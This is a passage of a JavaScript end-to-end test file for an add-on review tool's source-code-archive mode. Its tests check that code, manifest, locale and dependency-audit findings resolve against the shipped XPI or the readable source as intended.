// End-to-end test for SCA mode (source code archive): the positional XPI is the
// SHIPPED artifact (manifest.json + reachability + WAR + bundled-files resolve against
// it), while the readable --sca-root archive is the review target the code checks
// analyze. The built layout deliberately differs from the source layout - the XPI's
// entry scripts are named differently than the source's - which is the case that
// stresses the shipped/review-target split.

import { test, mock } from "node:test";
import { REVIEW_MODE } from "../../src/lib/enum.js";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";

import { runPipeline } from "../../src/pipeline.js";
import { formatText } from "../../src/report/format.js";
import { loadRegistry } from "../../src/checks/registry.js";
import { fixtureCacheOpts } from "../seed-caches.js";
import { reviewFilePaths } from "../../src/report/items.js";
import { pathStamp, submissionLeaf } from "../../src/util/dest.js";

// A cache pre-seeded from the fixtures so the schema / experiments / library-hash
// fetches all hit disk - these runs stay offline.
const OFFLINE = fixtureCacheOpts();

function tmpDir(files) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "wrr-sca-"));
  for (const [name, content] of Object.entries(files)) {
    const dest = path.join(dir, name);
    fs.mkdirSync(path.dirname(dest), { recursive: true });
    fs.writeFileSync(dest, content);
  }
  return dir;
}

// The SHIPPED XPI: built entry scripts (background.js / content.js) that load a
// web-accessible resource. This is a self-consistent built add-on. background.js ships
// MINIFIED (first-party, one dense line) so the XPI is not directly reviewable - which is
// what makes an SCA submission legitimate. An XPI whose first-party code is readable is
// still reviewed as SCA. Minified here also keeps the shipped bytes unlike the archive's,
// so sca-xpi-fully-included-in-archive stays out of these tests.
const XPI_FILES = {
  "manifest.json": JSON.stringify({
    manifest_version: 3,
    name: "SCA E2E",
    version: "1.0",
    background: { scripts: ["background.js"] },
    content_scripts: [{ matches: ["*://*/*"], js: ["content.js"] }],
    web_accessible_resources: [
      { resources: ["injected.js"], matches: ["*://*/*"] },
    ],
  }),
  "background.js": `var s=0;${"s=s+1;".repeat(240)}console.log("built bg",s);`,
  "content.js": `const u=browser.runtime.getURL("injected.js");const s=document.createElement("script");s.src=u;document.head.append(s);`,
  "injected.js": `console.log("built injected");`,
};

// The readable SOURCE: a different pre-build layout (entry file named main.js, not
// the manifest.json's background.js), carrying a real WebExtension API defect.
const SRC_FILES = {
  "package.json": JSON.stringify({ name: "sca-e2e", version: "1.0.0" }),
  // A source submission owes a lock whatever its package.json declares, and without one the
  // review stops early - which would withhold the very manual-review items these tests
  // assert on. Empty is enough: nothing here declares a dependency to cover.
  "package-lock.json": JSON.stringify({
    lockfileVersion: 3,
    packages: { "": {} },
  }),
  "src/main.js": `browser.totallyFakeNamespace.doThing();\n`,
  "src/content.js": `browser.runtime.getURL("injected.js");\n`,
  "src/injected.js": `console.log("source injected");\n`,
};

const has = (findings, ruleId, pred = () => true) =>
  findings.some((f) => f.ruleId === ruleId && pred(f));

// unknown-api escalates rather than rejecting, so a probe asking "did the code checks
// review this file" reads the escalation list. Same shape as `has`, other array.
const hasItem = (meta, ruleId, pred = () => true) =>
  (meta.manualReview ?? []).some((m) => m.ruleId === ruleId && pred(m));

// A FLAT layout: manifest.json + the source + the build tooling all sit at --sca-root.
// The whole submission is accepted and fully reviewed: the code checks review it, and the
// build review still traces the build off the root package.json (so a root build fault is
// caught).
const FLAT_SRC = {
  "manifest.json": JSON.stringify({
    manifest_version: 3,
    name: "Flat",
    version: "1.0",
    background: { scripts: ["app.js"] },
  }),
  "app.js": `browser.totallyFakeNamespace.doThing();\n`,
  "package.json": JSON.stringify({
    name: "flat-sca",
    version: "1.0.0",
    scripts: { build: "web-ext build" },
  }),
};

test("SCA e2e: a flat layout is accepted and fully reviewed", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir(FLAT_SRC);
  try {
    {
      const { findings, meta } = await runPipeline({
        addonPath: xpi,
        scaRoot: src,
        ...OFFLINE,
      });
      assert.equal(
        meta.reviewed,
        true,
        "the flat submission is reviewed, not rejected"
      );
      // The code checks review the root source: the fake API in app.js is caught.
      assert.ok(
        hasItem(
          meta,
          "unknown-api",
          (m) => m.file === "app.js" && /totallyFakeNamespace/.test(m.item)
        ),
        "the root source file is reviewed by the code checks"
      );
      // The build review works flat: collectBuildFiles traced the build off the root
      // package.json, which ships no lock, so the lock requirement rejects.
      assert.ok(
        has(findings, "sca-lock-file-missing"),
        "the missing lock is flagged (the build review runs in a flat layout)"
      );
    }
  } finally {
    fs.rmSync(xpi, { recursive: true, force: true });
    fs.rmSync(src, { recursive: true, force: true });
  }
});

// The rendered SCA report labels each finding's file:line by artifact and closes the
// Issues section with the legend footer - proving every finding runPipeline produces
// names the artifact it is about, and that `mode` is threaded into the report. An XPI
// review has neither.
test("SCA e2e: the rendered report carries [XPI]/[SCA] labels + the footer", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir({
    ...FLAT_SRC,
    "app.js": `browser.totallyFakeNamespace.doThing();\n`, // a source (SCA) finding
  });
  try {
    const result = await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      ...OFFLINE,
    });
    const report = formatText(result);
    assert.match(
      report,
      /\[SCA\] app\.js/,
      "a source finding is labelled [SCA]"
    );
    assert.match(
      report,
      /\[XPI\] = source file in the submitted XPI/,
      "the Issues section closes with the artifact legend"
    );
    // The pipeline exposes the mode, and every finding carries the artifact it is
    // about - the fact the label above was rendered from, not re-derived.
    assert.equal(result.mode, REVIEW_MODE.SCA);
    // The label above was rendered from a field on the finding, not worked out by the
    // renderer. The constructor refuses a finding that cannot say where its subject is,
    // so this pins which artifact each one named rather than that it named any.
    const stamped = result.findings.map((f) => f.artifact);
    assert.ok(
      stamped.every((a) => a === "XPI" || a === "SCA"),
      "every finding carries one of the two artifacts"
    );
    // The [SCA] app.js line above is an ESCALATED case, not a finding, so this also
    // pins the other half of the stamp: a manual item carries the artifact too, set
    // where the case was raised (src/checks/escalation.js manualRef).
    const manual = result.meta.manualReview ?? [];
    assert.equal(
      manual.find((m) => m.file === "app.js").artifact,
      "SCA",
      "the source case the report labelled [SCA] carries SCA"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// MODE-INVARIANCE: the built XPI is analysed the SAME way whether it is reviewed inside an
// SCA submission (a second artifact) or as a standalone XPI review (the review target). So
// the input:xpi checks - which read siblings.xpi's classification, reachability and
// api-usage - must produce the IDENTICAL findings for the same XPI in either mode. That is
// the whole point of building siblings.xpi one way regardless of mode; without it an
// input:xpi finding could silently depend on how the run was invoked.
test("SCA e2e: the built XPI's input:xpi findings match a standalone XPI review of it", async () => {
  // orphan.js is unreferenced in the XPI -> a deterministic unused-files (input:xpi) finding,
  // so the comparison is non-vacuous.
  const xpi = tmpDir({
    ...XPI_FILES,
    "orphan.js": `console.log("nobody imports me");\n`,
  });
  const src = tmpDir(SRC_FILES);
  try {
    const sca = await runPipeline({ addonPath: xpi, scaRoot: src, ...OFFLINE });
    const xpiOnly = await runPipeline({ addonPath: xpi, ...OFFLINE });
    assert.equal(
      sca.mode,
      REVIEW_MODE.SCA,
      "the minified XPI keeps the review in SCA mode"
    );

    // The findings from input:xpi rules only. Asked of the REGISTRY, which answers the
    // same in both runs - a finding's own `artifact` cannot serve here, because in a
    // standalone XPI review there is one artifact and every finding carries it. In that
    // review the source IS the XPI, so its input:source checks also run, and filtering to
    // the input:xpi route is what isolates the shipped-artifact analysis.
    const registry = loadRegistry();
    const xpiFindings = (r) =>
      r.findings
        .filter((f) => registry.inputFor(f.ruleId) === "xpi")
        .map((f) => `${f.ruleId}|${f.file}|${f.item ?? f.loc ?? ""}`)
        .sort();

    const inSca = xpiFindings(sca);
    assert.ok(
      inSca.includes("unused-files|orphan.js|"),
      "the orphaned XPI file is flagged unused (a real input:xpi finding fired)"
    );
    assert.deepEqual(
      inSca,
      xpiFindings(xpiOnly),
      "the built XPI's input:xpi findings are identical in SCA and standalone-XPI review"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// --sca-root is the whole of it: the flag switches SCA mode on AND names the review source,
// so a submission needs only the one.
test("SCA e2e: --sca-root alone switches to SCA mode and is the review source", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir(FLAT_SRC);
  try {
    const { findings, meta } = await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      ...OFFLINE,
    });
    assert.equal(meta.reviewed, true, "SCA mode engaged from --sca-root alone");
    // The root source is reviewed (proves mode === "sca", source === the root).
    assert.ok(
      hasItem(
        meta,
        "unknown-api",
        (m) => m.file === "app.js" && /totallyFakeNamespace/.test(m.item)
      ),
      "the root source file is reviewed"
    );
    // The build review ran (SCA-only), so the root package.json's missing lock is rejected.
    assert.ok(
      has(findings, "sca-lock-file-missing"),
      "the SCA build review ran with --sca-root alone"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// The dependency audit reads the root package.json, which in a flat layout IS the review
// addon's own package.json - so resolveVendor + the vendor checks run exactly as in a
// nested layout. A vulnerable devDependency is surfaced by vendor-vulnerable-dev.
test("SCA e2e: a flat layout audits the root package.json dependencies", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir({
    ...FLAT_SRC,
    "package.json": JSON.stringify({
      name: "flat-sca",
      version: "1.0.0",
      devDependencies: { "build-tool": "1.0.0" },
    }),
  });
  const vendorNet = {
    fetchBytes: async () => Buffer.from(""),
    fetchJson: async () => ({}),
    postJson: async (_url, body) =>
      body?.package?.name === "build-tool"
        ? {
            vulns: [
              {
                id: "GHSA-flat-0000-0000",
                aliases: ["CVE-2021-9999"],
                database_specific: { severity: "HIGH" },
                affected: [
                  {
                    package: { ecosystem: "npm", name: "build-tool" },
                    ranges: [
                      {
                        type: "SEMVER",
                        events: [{ introduced: "0" }, { fixed: "2.0.0" }],
                      },
                    ],
                  },
                ],
              },
            ],
          }
        : { vulns: [] },
  };
  try {
    const { findings } = await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      ...OFFLINE,
      vendorNet,
    });
    assert.ok(
      has(findings, "vendor-vulnerable-dev", (f) => /build-tool/.test(f.item)),
      "the root package.json's dependencies are audited in a flat layout"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// A third-party library bundled into the readable SOURCE (a committed copy the Mozilla
// hash DB misses) that is NOT declared in package.json gets the full identification the
// XPI review runs: a jsDelivr content-hash match (so it is recognized as a library -
// excluded from content review, not rejected by minified-code) and an OSV audit (so a
// vulnerable one is caught by vendor-vulnerable). Without that pass over the SCA source
// this file would be rejected as minified and its vulnerability missed.
test("SCA e2e: an undeclared source-bundled library is CDN-identified and OSV-audited", async () => {
  const LIB = `var s=0;${"s=s+1;".repeat(240)}`; // one dense line of statements -> minified
  const { rawSha256 } = await import("../../src/normalize/hash.js");
  const libHash = rawSha256(Buffer.from(LIB));
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir({
    "manifest.json": JSON.stringify({
      manifest_version: 3,
      name: "L",
      version: "1.0",
      background: { scripts: ["app.js"] },
    }),
    "app.js": "console.log('app');\n",
    "vendor/lib.min.js": LIB, // undeclared: not in package.json
    "package.json": JSON.stringify({ name: "l", version: "1.0.0" }),
  });
  // A net that recognizes the vendored file's hash on jsDelivr (popular) and returns an OSV
  // advisory for it - so it is identified AND audited.
  const vendorNet = {
    fetchBytes: async () => Buffer.from(""),
    fetchJson: async (url) => {
      if (url.includes("api.npmjs.org/downloads/")) {
        return { downloads: 50000 };
      }
      if (url.includes("api.github.com/repos/")) {
        return { stargazers_count: 5000 };
      }
      if (url.split("/").pop() === libHash) {
        return {
          type: "npm",
          name: "leftpad",
          version: "1.0.0",
          file: "/lib.min.js",
        };
      }
      throw new Error("HTTP 404");
    },
    postJson: async (_url, body) =>
      body?.package?.name === "leftpad"
        ? {
            vulns: [
              {
                id: "GHSA-lib-0000-0000",
                aliases: ["CVE-2020-0001"],
                database_specific: { severity: "HIGH" },
                affected: [
                  {
                    package: { ecosystem: "npm", name: "leftpad" },
                    ranges: [
                      {
                        type: "SEMVER",
                        events: [{ introduced: "0" }, { fixed: "2.0.0" }],
                      },
                    ],
                  },
                ],
              },
            ],
          }
        : { vulns: [] },
  };
  const cdnCache = fs.mkdtempSync(path.join(os.tmpdir(), "wrr-cdn-"));
  try {
    const { findings } = await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      ...OFFLINE,
      vendorNet,
      cdnLookupCache: cdnCache,
    });
    // Identified on the CDN -> library -> exempt from minified-code (which would reject an
    // unrecognized minified file in the readable source).
    assert.ok(
      !has(findings, "minified-code", (f) => /lib\.min\.js/.test(f.file)),
      "the CDN-identified source library is not rejected as minified"
    );
    // OSV-audited on the SOURCE -> vendor-vulnerable (would not fire on HEAD).
    assert.ok(
      has(findings, "vendor-vulnerable", (f) => /leftpad/.test(f.item ?? "")),
      "the undeclared source-bundled library is OSV-audited"
    );
  } finally {
    [xpi, src, cdnCache].forEach((d) =>
      fs.rmSync(d, { recursive: true, force: true })
    );
  }
});

// The --sca-root tree is read ONCE and the archive is shared by the review and the build
// trace (loadSourceArchive, then collectBuildFiles over the same view), so it is not walked
// (nor its symlinks warned) twice - a loadAddon(scaRoot) per reader would read the root
// twice.
test("SCA: the --sca-root archive is read once, not twice", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir(SRC_FILES);
  const realReaddir = fs.readdirSync;
  let rootReads = 0;
  mock.method(fs, "readdirSync", (p, ...rest) => {
    if (path.resolve(p) === path.resolve(src)) {
      rootReads += 1;
    }
    return realReaddir(p, ...rest);
  });
  try {
    await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      ...OFFLINE,
    });
    assert.equal(rootReads, 1, "--sca-root walked once, not twice");
  } finally {
    mock.restoreAll();
    fs.rmSync(xpi, { recursive: true, force: true });
    fs.rmSync(src, { recursive: true, force: true });
  }
});

// WHY loadSourceArchive reads no manifest.json while the XPI is loaded with one: the two
// artifacts answer "what is this add-on's manifest.json" differently, and only one of them is
// allowed to. The XPI's is what Thunderbird loads, so it is the review's one authority. A
// source archive's is a PRE-BUILD template - the build may rewrite it, generate it, or draw
// the add-on's real root from somewhere else, and a submission need not hold one at all - so
// whatever it says is at best unconfirmed and at worst a different add-on.
//
// The FILE is among the archive's files, like every other file the submission contains. What
// keeps the two apart is the RECORD: ctx.manifest is projected from the XPI by name
// (src/pipeline.js), and no artifact carries a record of its own at all
// (src/checks/context.js), so the archive's own record is unreachable from a check even if
// one existed. Both halves are pinned in tests/unit/context.test.js, where a deliberately
// leaking record has to come back undefined - there is nothing left for a pipeline-level
// test to distinguish, since no run can put that template in front of a check.

// What the report and the machine-readable document SAY was reviewed: the shipped add-on,
// and separately the two values the run was given. Named by ARTIFACT rather than by role,
// each a real path, and none of them fused: a source gluing its subtree on with a colon
// ("<root>:src") is a value no reader could resolve and none could split back,
// since a directory name may hold one. The subtree is normalised the way the loader
// normalises it, so the value names what was read whichever spelling the flag was given.
test("SCA meta names the artifacts, each a real path", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir(SRC_FILES);
  try {
    const { meta } = await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      ...OFFLINE,
    });
    assert.equal(meta.xpi, xpi);
    assert.equal(meta.scaRoot, src);
    // Absolute, like every other path here: the flag's spellings are resolved by the
    // arg-array reader (src/cli.js), and what reaches meta is the folder that was read.
    for (const value of [meta.xpi, meta.scaRoot]) {
      assert.equal(fs.existsSync(value), true, `${value} is a real path`);
    }
    // The optional third: named only when the flag was given, because a name printed for a
    // value nobody supplied says something false. It is also the only place a reader learns
    // that a subtree was excluded from the WebExtension checks, and which one.
    assert.equal(meta.scaExpSource, undefined);
    const { meta: withExp } = await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      scaExpSource: path.join(src, "src", "experiments"),
      ...OFFLINE,
    });
    assert.equal(withExp.scaExpSource, path.join(src, "src", "experiments"));

    // The fields a role-named meta carried, and the fused value with them.
    assert.equal(meta.addon, undefined);
    assert.equal(meta.shippedAddon, undefined);
    assert.equal(meta.addonKind, undefined);
  } finally {
    fs.rmSync(xpi, { recursive: true, force: true });
    fs.rmSync(src, { recursive: true, force: true });
  }
});

// The two files a --llm-review run NAMES and never writes: the add-on description, and -
// only in a source code review - what building the add-on takes. Both sit beside the
// submitted add-on, never inside it, so the links the reviewer is handed open where they
// are working. The build one is gated on the review being a source code one, not on
// --llm-skip-summary, which withholds the description alone.
test("an SCA --llm-review names a build report beside the add-on", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir(SRC_FILES);
  try {
    const { meta } = await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      llmReview: true,
      ...OFFLINE,
    });
    assert.match(meta.buildFile, /\.build\.md$/);
    assert.equal(path.dirname(meta.buildFile), path.dirname(xpi));
    assert.equal(meta.buildFile.startsWith(`${xpi}${path.sep}`), false);
    // One name and one moment for all of them, so none can drift from this review.
    const base = path.basename(meta.reviewFile, ".review.json");
    assert.equal(path.basename(meta.buildFile), `${base}.build.md`);
    assert.equal(path.basename(meta.summaryFile), `${base}.summary.md`);
    assert.equal(path.basename(meta.reportFile), `${base}.report.md`);
    // Named, never written: this tool only says where these two go.
    assert.equal(fs.existsSync(meta.buildFile), false);
    assert.equal(fs.existsSync(meta.summaryFile), false);

    // An XPI review has no build to reproduce, so it names none - but every review has a
    // report, and that one this tool writes itself, so it is named either way.
    const xpiOnly = await runPipeline({
      addonPath: xpi,
      llmReview: true,
      ...OFFLINE,
    });
    assert.equal(xpiOnly.meta.buildFile, undefined);
    assert.match(xpiOnly.meta.reportFile, /\.report\.md$/);
  } finally {
    fs.rmSync(xpi, { recursive: true, force: true });
    fs.rmSync(src, { recursive: true, force: true });
  }
});

test("SCA e2e: code checks review the source; manifest/WAR resolve against the XPI", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir(SRC_FILES);
  try {
    const result = await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      ...OFFLINE,
    });
    const { findings } = result;

    // (1) Code checks review ALL the source: a fake API in main.js - a file the
    // XPI manifest.json never names (so it is unreachable from the built entry points) -
    // is still caught, because the SCA code checks review every source file.
    assert.ok(
      hasItem(
        result.meta,
        "unknown-api",
        (m) => m.file === "src/main.js" && /totallyFakeNamespace/.test(m.item)
      ),
      "expected unknown-api on the non-entry source file main.js"
    );

    // (2) bundled-files resolves manifest.json refs against the XPI: background.js is a
    // built entry present in the XPI but absent from the source tree, so it must
    // NOT be reported as "not bundled".
    assert.ok(
      !has(findings, "bundled-files", (f) => /background\.js/.test(f.item)),
      "background.js (a built entry) must not be flagged as unbundled"
    );

    // (3) minimize-WAR / reachability judged over the XPI: injected.js is loaded by
    // the XPI's own content script, so the exposure is needed - no false finding.
    assert.ok(
      !has(findings, "minimize-web-accessible-resources"),
      "injected.js is loaded by the shipped content script - no WAR finding"
    );

    assert.equal(result.meta.reviewed, true);
  } finally {
    fs.rmSync(xpi, { recursive: true, force: true });
    fs.rmSync(src, { recursive: true, force: true });
  }
});

test("SCA e2e: --sca-exp-source excludes the Experiment subtree from the code checks", async () => {
  const xpi = tmpDir(XPI_FILES);
  // Source carries a privileged Experiment file (ChromeUtils) under experiments/.
  const src = tmpDir({
    ...SRC_FILES,
    "src/experiments/exp.js": `ChromeUtils.importESModule("resource:///x.sys.mjs");\n`,
  });
  try {
    const base = {
      addonPath: xpi,
      scaRoot: src,
      ...OFFLINE,
    };
    // Without the flag, the privileged Experiment code is reviewed as WebExtension
    // code and false-positives core-symbol-in-webext.
    const without = await runPipeline(base);
    assert.ok(
      has(
        without.findings,
        "core-symbol-in-webext",
        (f) => f.file === "src/experiments/exp.js"
      ),
      "without --sca-exp-source the experiment file is (falsely) flagged"
    );

    // With the flag - an absolute path inside --sca-root - the
    // experiment subtree is excluded, no false positive, while the real defect in main.js
    // is still caught.
    const withExp = await runPipeline({
      ...base,
      scaExpSource: path.join(src, "src", "experiments"),
    });
    assert.ok(
      !has(
        withExp.findings,
        "core-symbol-in-webext",
        (f) => f.file === "src/experiments/exp.js"
      ),
      "with --sca-exp-source the experiment subtree is excluded"
    );
    assert.ok(
      hasItem(withExp.meta, "unknown-api", (m) => m.file === "src/main.js"),
      "the WebExtension code is still reviewed with --sca-exp-source"
    );

    // What a source flag may NOT name is a folder outside --sca-root: that one sits on the
    // reviewing machine and is not the submission's. The spelling is free - every path opt
    // reaching the pipeline is absolute (src/cli.js resolves them) - so this is a question
    // about where it lands.
    await assert.rejects(
      runPipeline({ ...base, scaExpSource: path.join(xpi, "experiments") }),
      /is not inside --sca-root/
    );
  } finally {
    fs.rmSync(xpi, { recursive: true, force: true });
    fs.rmSync(src, { recursive: true, force: true });
  }
});

// The archive cannot say which of its folders holds the Experiment, so a source review of
// an add-on that ships one does not start until --sca-exp-source names it - otherwise its
// privileged code would be reviewed, and rejected, as WebExtension code.
test("SCA e2e: an Experiment add-on needs --sca-exp-source", async () => {
  const manifest = JSON.parse(XPI_FILES["manifest.json"]);
  const xpi = tmpDir({
    ...XPI_FILES,
    "manifest.json": JSON.stringify({
      ...manifest,
      experiment_apis: { myapi: {} },
    }),
  });
  const src = tmpDir({
    ...SRC_FILES,
    "src/experiments/exp.js": `ChromeUtils.importESModule("resource:///x.sys.mjs");\n`,
  });
  try {
    const base = {
      addonPath: xpi,
      scaRoot: src,
      allowExperiments: true,
      ...OFFLINE,
    };
    await assert.rejects(runPipeline(base), /--sca-exp-source/);
    const review = await runPipeline({
      ...base,
      scaExpSource: path.join(src, "src", "experiments"),
    });
    assert.ok(review.findings, "with the folder named the review runs");
  } finally {
    fs.rmSync(xpi, { recursive: true, force: true });
    fs.rmSync(src, { recursive: true, force: true });
  }
});

test("SCA e2e: --sca-exp-source may sit beside the add-on code under --sca-root", async () => {
  const xpi = tmpDir(XPI_FILES);
  // The Experiment lives OUTSIDE the review source (src/), as a sibling under --sca-root:
  // a valid layout, and the one a "must be a folder within the add-on" rule would refuse.
  const src = tmpDir({
    ...SRC_FILES,
    "experiment/exp.js": `ChromeUtils.importESModule("resource:///x.sys.mjs");\n`,
  });
  try {
    const base = {
      addonPath: xpi,
      scaRoot: src,
      ...OFFLINE,
    };
    // Accepted (no throw) when the sibling folder sits anywhere under --sca-root.
    for (const scaExpSource of [path.join(src, "experiment")]) {
      const res = await runPipeline({ ...base, scaExpSource });
      // The review source is still reviewed...
      assert.ok(
        hasItem(res.meta, "unknown-api", (m) => m.file === "src/main.js"),
        "the WebExtension source is reviewed with a sibling --sca-exp-source"
      );
      // ...and the out-of-source Experiment is never reviewed as WebExtension code (it is
      // partitioned into its own view, so nothing false-positives on ChromeUtils).
      assert.ok(
        !has(res.findings, "core-symbol-in-webext"),
        "the sibling Experiment is not reviewed as WebExtension code"
      );
    }
  } finally {
    fs.rmSync(xpi, { recursive: true, force: true });
    fs.rmSync(src, { recursive: true, force: true });
  }
});

test("SCA e2e: unused-files flags the build's dead files, not source scaffolding", async () => {
  // The XPI ships a file no entry point reaches; the source repo has its own
  // unreferenced scaffolding that never ships.
  const xpi = tmpDir({
    ...XPI_FILES,
    "orphan.js": `console.log("dead weight in the build");`,
  });
  const src = tmpDir({
    ...SRC_FILES,
    "src/leftover-config.js": `console.log("unreferenced source scaffolding");`,
  });
  try {
    const { findings } = await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      ...OFFLINE,
    });
    // unused-files describes the SHIPPED artifact: the XPI's dead file is flagged...
    assert.ok(
      has(findings, "unused-files", (f) => f.file === "orphan.js"),
      "expected the XPI's dead file to be flagged"
    );
    // ...but the source repo's unreferenced scaffolding never ships, so it is not.
    assert.ok(
      !findings.some((f) => f.file === "leftover-config.js"),
      "source-repo scaffolding must not be flagged in SCA"
    );
  } finally {
    fs.rmSync(xpi, { recursive: true, force: true });
    fs.rmSync(src, { recursive: true, force: true });
  }
});

test("SCA e2e: locale checks evaluate _locales against the XPI, not the source", async () => {
  // The XPI ships _locales/en (as a build would); the readable source tree does
  // not (generated by the build, so an archive need not hold them).
  const xpi = tmpDir({
    "manifest.json": JSON.stringify({
      manifest_version: 3,
      name: "L",
      version: "1.0",
      default_locale: "en",
      background: { scripts: ["bg.js"] },
    }),
    "bg.js": `console.log(1);`,
    "_locales/en/messages.json": `{"name":{"message":"L"}}`,
  });
  const src = tmpDir(SRC_FILES); // no _locales in the source
  try {
    const { findings } = await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      ...OFFLINE,
    });
    // The shipped XPI satisfies default_locale, so there is no false reject - even
    // though the source has no _locales directory.
    assert.ok(
      !has(findings, "default-locale-unused"),
      "default_locale must be checked against the XPI's _locales, not the source"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

test("SCA e2e: missing-english-localization checks the XPI's _locales, not source text", async () => {
  // The shipped XPI ships an English locale; the source has no _locales and its
  // visible text is German. The check must see the XPI's English locale and pass,
  // not language-detect the source text and falsely flag a non-English add-on.
  const xpi = tmpDir({
    "manifest.json": JSON.stringify({
      manifest_version: 3,
      name: "L",
      version: "1.0",
      default_locale: "en",
      background: { scripts: ["bg.js"] },
    }),
    "bg.js": `console.log(1);`,
    "_locales/en/messages.json": `{"name":{"message":"L"}}`,
  });
  const src = tmpDir({
    ...SRC_FILES,
    "src/popup.html": `<html><body><h1>Willkommen bei unserer Erweiterung</h1><p>Diese Anwendung verwaltet Ihre Nachrichten und Einstellungen sorgfaeltig und zuverlaessig.</p></body></html>`,
  });
  try {
    const { findings } = await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      ...OFFLINE,
    });
    assert.ok(
      !has(findings, "missing-english-localization"),
      "the XPI's English _locales must satisfy the check, not the German source text"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

test("SCA e2e: background-module judges the XPI's background script, not the ESM source", async () => {
  const manifest = JSON.stringify({
    manifest_version: 3,
    name: "B",
    version: "1.0",
    background: { scripts: ["background.js"] }, // no type: module
  });
  // (a) The source uses ESM, but the build bundles it to a CLASSIC shipped script,
  // so the manifest.json correctly omits type:module. Reading the source would
  // false-positive; reading the shipped classic script does not.
  const xpiClassic = tmpDir({
    "manifest.json": manifest,
    "background.js": `(function () { console.log("bundled classic"); })();`,
  });
  const srcEsm = tmpDir({
    "package.json": "{}",
    "src/background.js": `import { x } from "./util.js";\nconsole.log(x);`,
    "src/util.js": `export const x = 1;`,
  });
  // (b) The shipped script genuinely IS ESM (e.g. a rollup --format es bundle) with
  // no type:module - a real loading defect the check must still catch over the XPI.
  const xpiEsm = tmpDir({
    "manifest.json": manifest,
    "background.js": `import { x } from "./util.js";\nconsole.log(x);`,
    "util.js": `export const x = 1;`,
  });
  try {
    const a = await runPipeline({
      addonPath: xpiClassic,
      scaRoot: srcEsm,
      ...OFFLINE,
    });
    assert.ok(
      !has(a.findings, "background-module"),
      "an ESM source bundled to a classic shipped script must not false-positive"
    );
    const b = await runPipeline({
      addonPath: xpiEsm,
      scaRoot: srcEsm,
      ...OFFLINE,
    });
    assert.ok(
      has(b.findings, "background-module"),
      "a genuinely-ESM shipped background script with no type:module is still caught"
    );
  } finally {
    [xpiClassic, srcEsm, xpiEsm].forEach((d) =>
      fs.rmSync(d, { recursive: true, force: true })
    );
  }
});

test("SCA e2e: trademark-violation resolves a localized name via the XPI's _locales", async () => {
  // The displayed name is a __MSG_ placeholder resolved from the XPI's _locales to
  // a trademark-violating string; the source has no _locales. The check must
  // resolve against the shipped XPI, not silently miss it over the source.
  const xpi = tmpDir({
    "manifest.json": JSON.stringify({
      manifest_version: 3,
      name: "__MSG_extName__",
      version: "1.0",
      default_locale: "en",
      background: { scripts: ["bg.js"] },
    }),
    "bg.js": `console.log(1);`,
    "_locales/en/messages.json": `{"extName":{"message":"Firefox Helper"}}`,
  });
  const src = tmpDir(SRC_FILES); // no _locales in the source
  try {
    const { findings } = await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      ...OFFLINE,
    });
    assert.ok(
      has(findings, "trademark-violation"),
      "a localized trademark-violating name must be caught via the XPI's _locales"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// A vulnerable devDependency is a real risk in SCA because the reviewer builds the
// add-on from source. The dedicated vendor-vulnerable-dev check (sca:true) runs
// only here - it OSV-audits the root package.json's devDependencies and surfaces
// the hit, while the prod vendor-vulnerable check stays silent for a dev-only dep.
test("SCA e2e: a vulnerable devDependency is flagged by vendor-vulnerable-dev", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir({
    ...SRC_FILES,
    "package.json": JSON.stringify({
      name: "sca-e2e",
      version: "1.0.0",
      devDependencies: { "build-tool": "1.0.0" },
    }),
  });
  // Injected OSV transport: one HIGH advisory for the dev dep, fixed in 2.0.0.
  const vendorNet = {
    fetchBytes: async () => Buffer.from(""),
    fetchJson: async () => ({}),
    postJson: async (_url, body) =>
      body?.package?.name === "build-tool"
        ? {
            vulns: [
              {
                id: "GHSA-dev0-0000-0000",
                aliases: ["CVE-2021-0001"],
                database_specific: { severity: "HIGH" },
                affected: [
                  {
                    package: { ecosystem: "npm", name: "build-tool" },
                    ranges: [
                      {
                        type: "SEMVER",
                        events: [{ introduced: "0" }, { fixed: "2.0.0" }],
                      },
                    ],
                  },
                ],
              },
            ],
          }
        : { vulns: [] },
  };
  try {
    const { findings } = await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      ...OFFLINE,
      vendorNet,
    });
    assert.ok(
      has(findings, "vendor-vulnerable-dev", (f) => /build-tool/.test(f.item)),
      "expected vendor-vulnerable-dev on the vulnerable devDependency"
    );
    // The prod/shipped vulnerability check is a separate set - a dev-only dep must
    // not trip it.
